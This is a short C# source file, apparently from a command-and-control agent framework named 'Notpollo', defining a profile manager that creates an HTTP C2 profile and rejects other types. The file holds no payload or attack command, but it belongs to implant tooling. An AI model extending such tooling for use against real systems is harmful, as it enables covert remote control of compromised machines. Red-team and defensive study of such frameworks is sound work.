﻿using NotpolloInterop.Interfaces;
using NotpolloInterop.Serializers;
using HttpTransport;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Notpollo.Management.C2
{
    public class C2ProfileManager : NotpolloInterop.Classes.C2ProfileManager
    {
        public C2ProfileManager(IAgent agent) : base(agent)
        {

        }

        public override IC2Profile NewC2Profile(Type c2, ISerializer serializer, Dictionary<string, string> parameters)
        {
            if (c2 == typeof(HttpProfile))
            {
                return new HttpProfile(parameters, serializer, Agent);
            } else
            {
                throw new ArgumentException($"Unsupported C2 Profile type: {c2.Name}");
            }
        }
    }
}
